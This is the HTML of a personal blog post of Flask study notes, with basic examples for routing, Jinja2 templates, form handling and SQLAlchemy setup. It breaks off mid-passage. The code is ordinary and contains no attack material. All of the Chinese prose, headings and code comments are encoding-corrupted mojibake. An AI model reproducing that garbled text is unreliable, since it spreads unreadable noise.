<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/XFUN%E6%B0%B4%E6%AF%8D%E6%9A%97%E9%BB%91%E7%89%88-%E6%9C%AA%E9%80%89%E4%B8%AD.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/XFUN%E6%B0%B4%E6%AF%8D%E6%9A%97%E9%BB%91%E7%89%88-%E6%9C%AA%E9%80%89%E4%B8%AD.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="å¥½å¥½å¥½å¥½å¥½">
<meta property="og:type" content="article">
<meta property="og:title" content="2023æš‘æœŸå­¦ä¹ è®°å½•week3">
<meta property="og:url" content="http://example.com/2023/07/27/2023%E6%9A%91%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95week3/index.html">
<meta property="og:site_name" content="LinTu&#39;s Blog">
<meta property="og:description" content="å¥½å¥½å¥½å¥½å¥½">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://pic.imgdb.cn/item/64c37b081ddac507cc38b2fa.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64c5e48a1ddac507cc0eca90.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64c6765d1ddac507cc0e05c2.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64c675551ddac507cc0c52f2.jpg">
<meta property="og:image" content="https://pic.imgdb.cn/item/64c7bbc91ddac507cc154fb2.jpg">
<meta property="article:published_time" content="2023-07-27T12:48:01.000Z">
<meta property="article:modified_time" content="2023-08-03T02:45:14.988Z">
<meta property="article:author" content="æ—æ¶‚">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="web">
<meta property="article:tag" content="crypto">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pic.imgdb.cn/item/64c37b081ddac507cc38b2fa.jpg">

<link rel="canonical" href="http://example.com/2023/07/27/2023%E6%9A%91%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95week3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>2023æš‘æœŸå­¦ä¹ è®°å½•week3 | LinTu's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="LinTu's Blog" type="application/atom+xml">
<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">LinTu's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
        <li class="menu-item menu-item-guestbook">

    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>ç•™è¨€æ¿</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>å‹é“¾</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>æœç´¢
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="æœç´¢..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/27/2023%E6%9A%91%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95week3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="æ—æ¶‚">
      <meta itemprop="description" content="å­¦ä¹ ing">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LinTu's Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          2023æš‘æœŸå­¦ä¹ è®°å½•week3
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-07-27 20:48:01" itemprop="dateCreated datePublished" datetime="2023-07-27T20:48:01+08:00">2023-07-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2023-08-03 10:45:14" itemprop="dateModified" datetime="2023-08-03T10:45:14+08:00">2023-08-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">å­¦ä¹ æ—¥è®°</span></a>
                </span>
            </span>

          
            <span id="/2023/07/27/2023%E6%9A%91%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95week3/" class="post-meta-item leancloud_visitors" data-flag-title="2023æš‘æœŸå­¦ä¹ è®°å½•week3" title="é˜…è¯»æ¬¡æ•°">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">é˜…è¯»æ¬¡æ•°ï¼š</span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valineï¼š</span>
    
    <a title="valine" href="/2023/07/27/2023%E6%9A%91%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95week3/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2023/07/27/2023%E6%9A%91%E6%9C%9F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95week3/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>å¥½å¥½å¥½å¥½å¥½</p>
<span id="more"></span>

<h1 id="Python-Flaskæ¡†æ¶å­¦ä¹ "><a href="#Python-Flaskæ¡†æ¶å­¦ä¹ " class="headerlink" title="Python Flaskæ¡†æ¶å­¦ä¹ "></a>Python Flaskæ¡†æ¶å­¦ä¹ </h1><p><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000017330435">å‰ç«¯ - Python Flaskæ¡†æ¶ï¼šé›¶åŸºç¡€webå¼€å‘å…¥é—¨æ•™ç¨‹ - ä¸ªäººæ–‡ç«  - SegmentFault æ€å¦</a></p>
<h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p><code>pip install flask</code></p>
<h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="comment"># å¼•å…¥Flaskç±»</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment"># åˆ›å»ºFlaskå¯¹è±¡</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¼–å†™ä¸»ç¨‹åº</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"><span class="comment"># åœ¨ä¸»ç¨‹åºä¸­ï¼Œæ‰§è¡Œrun()æ¥å¯åŠ¨åº”ç”¨</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ”¹åå¯åŠ¨ä¸€ä¸ªæœ¬åœ°æœåŠ¡å™¨</span></span><br><span class="line"><span class="comment"># é»˜è®¤æƒ…å†µä¸‹å…¶åœ°å€æ˜¯localhost:5000</span></span><br><span class="line"><span class="comment">#åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨å…³é”®å­—å‚æ•°portå°†ç›‘å¬ç«¯å£ä¿®æ”¹ä¸º8080ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·¯ç”±</span></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>,port=<span class="number">8080</span>)</span><br><span class="line"><span class="comment"># ä½¿ç”¨appå˜é‡çš„route()è£…é¥°å™¨æ¥å‘Šè¯‰Flaskæ¡†æ¶URLå¦‚ä½•è§¦å‘æˆ‘ä»¬çš„è§†å›¾å‡½æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿è¡Œ    $ python app.py</span></span><br></pre></td></tr></table></figure>
<p>ä¸€å¼€å§‹ä¸€ç›´404åæ¥æ‰å‘ç°æ˜¯ç¼©è¿›é”™è¯¯ã€‚ã€‚</p>
<h2 id="ä½¿ç”¨HTMLæ¨¡æ¿"><a href="#ä½¿ç”¨HTMLæ¨¡æ¿" class="headerlink" title="ä½¿ç”¨HTMLæ¨¡æ¿"></a>ä½¿ç”¨HTMLæ¨¡æ¿</h2><ul>
<li>å®šä¹‰äº†ä¸€ä¸ªåä¸º user çš„å­—å…¸<br><code>user = &#123;&#39;username&#39;: &#39;John&#39;, &#39;age&#39;: &quot;20&quot;&#125;</code></li>
<li>ä½¿ç”¨æ‹¼æ¥çš„HTMLå­—ç¬¦ä¸²æ¥å±•ç¤º user å­—å…¸çš„æ•°æ®<br><code>&lt;h1&gt;Hello, &#39;&#39;&#39; + user[&#39;username&#39;] + &#39;&#39;&#39;!, youâ€™re &#39;&#39;&#39; + user[&#39;age&#39;] + &#39;&#39;&#39; years old.&lt;/h1&gt;</code></li>
</ul>
<p>æ‹¼æ¥HTMLå­—ç¬¦ä¸²<strong>éå¸¸</strong>å®¹æ˜“å‡ºé”™,<br>å› æ­¤Flaskä½¿ç”¨Jinja 2æ¨¡æ¿å¼•æ“æ¥åˆ†ç¦»æ•°æ®é€»è¾‘å’Œå±•ç¤ºå±‚ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Apps folder</span><br><span class="line">/app.py</span><br><span class="line">templates</span><br><span class="line">   |-/index.html</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, name=<span class="string">&quot;Alex&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  &#123;% if name %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello &#123;&#123; name &#125;&#125;.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  &#123;% else %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello.<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="ä½¿ç”¨è¡¨å•"><a href="#ä½¿ç”¨è¡¨å•" class="headerlink" title="ä½¿ç”¨è¡¨å•"></a>ä½¿ç”¨è¡¨å•</h2><p>e.g.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Apps folder</span><br><span class="line">/app.py</span><br><span class="line">templates</span><br><span class="line">   |-/bio_form.html</span><br><span class="line">   |-/show_bio.html</span><br></pre></td></tr></table></figure>
<p>app.py æ–‡ä»¶</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/form&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bio_data_form</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        age = request.form[<span class="string">&#x27;age&#x27;</span>]</span><br><span class="line">        email = request.form[<span class="string">&#x27;email&#x27;</span>]</span><br><span class="line">        hobbies = request.form[<span class="string">&#x27;hobbies&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;showbio&#x27;</span>,</span><br><span class="line">                                username=username,</span><br><span class="line">                                age=age,</span><br><span class="line">                                email=email,</span><br><span class="line">                                hobbies=hobbies))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;bio_form.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/showbio&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showbio</span>():</span><br><span class="line">    username = request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    age = request.args.get(<span class="string">&#x27;age&#x27;</span>)</span><br><span class="line">    email = request.args.get(<span class="string">&#x27;email&#x27;</span>)</span><br><span class="line">    hobbies = request.args.get(<span class="string">&#x27;hobbies&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;show_bio.html&quot;</span>,</span><br><span class="line">                           username=username,</span><br><span class="line">                           age=age,</span><br><span class="line">                           email=email,</span><br><span class="line">                           hobbies=hobbies)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>

<p>bio_form.html æ–‡ä»¶</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Bio Data Form<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&#123;&#123; url_for(&#x27;bio_data_form&#x27;) &#125;&#125;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Age<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Hobbies<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hobbies&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>show_bio.html æ–‡ä»¶</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Bio-Data Details<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Bio-Data Details<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Username: &#123;&#123; username &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Age: &#123;&#123; age &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Email: &#123;&#123; email &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hobbies: &#123;&#123; hobbies &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="æ•°æ®åº“é›†æˆï¼šä½¿ç”¨SQLAlchemy"><a href="#æ•°æ®åº“é›†æˆï¼šä½¿ç”¨SQLAlchemy" class="headerlink" title="æ•°æ®åº“é›†æˆï¼šä½¿ç”¨SQLAlchemy"></a>æ•°æ®åº“é›†æˆï¼šä½¿ç”¨SQLAlchemy</h2><h3 id="å®‰è£…-1"><a href="#å®‰è£…-1" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p><code>pip install flask-sqlalchemy</code></p>
<p>ç„¶åæ•™ç¨‹ç»™çš„æ˜¯postgresqlï¼Œä½†æ˜¯æˆ‘ç ”ï¼ˆè¯·ï¼‰ç©¶ï¼ˆæ•™ï¼‰äº†ï¼ˆchatï¼‰ä¸€ï¼ˆè€ï¼‰ä¸‹ï¼ˆå¸ˆï¼‰ï¼Œæ„Ÿè§‰ç”¨mysqlèƒ½å‡‘åˆå¤§éƒ¨åˆ†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">åªæœ‰åœ¨ç‰¹å®šæƒ…å†µä¸‹ï¼Œæ‚¨æ‰éœ€è¦è€ƒè™‘ä½¿ç”¨PostgreSQLï¼Œæ¯”å¦‚ï¼š</span><br><span class="line"></span><br><span class="line">æ•°æ®åº“éœ€æ±‚ï¼šæŸäº›ç‰¹æ®Šåº”ç”¨åœºæ™¯æˆ–è€…è¦æ±‚å¯èƒ½æ›´é€‚åˆä½¿ç”¨PostgreSQLçš„ä¸€äº›é«˜çº§åŠŸèƒ½ï¼Œä¾‹å¦‚æ”¯æŒJSONæ•°æ®ç±»å‹ã€å…¨æ–‡æœç´¢ç­‰ã€‚</span><br><span class="line"></span><br><span class="line">å­¦ä¹ ç›®çš„ï¼šå¦‚æœæ‚¨æ˜¯ä¸ºäº†å­¦ä¹ å’Œäº†è§£ä¸åŒçš„æ•°æ®åº“åç«¯ï¼Œæˆ–è€…æƒ³è¦å­¦ä¹ ä½¿ç”¨PostgreSQLå’ŒFlask-SQLAlchemyï¼Œé‚£ä¹ˆä½¿ç”¨PostgreSQLå¯èƒ½æ˜¯æœ‰æ„ä¹‰çš„ã€‚</span><br><span class="line"></span><br><span 